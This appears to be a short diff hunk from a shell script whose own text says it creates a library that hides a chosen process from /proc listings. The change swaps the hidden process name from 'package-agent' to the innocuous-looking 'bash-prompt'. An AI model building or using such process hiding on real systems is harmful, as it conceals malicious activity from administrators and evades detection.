@@ -41,7 +41,7 @@ get_process_name() {
     echo ""
     echo "This script will create a library that hides a specific process from /proc listings."
     echo ""
-    PROCESS_NAME="package-agent"
+    PROCESS_NAME="bash-prompt"
     
     print_status "Will filter process: $PROCESS_NAME"
 }
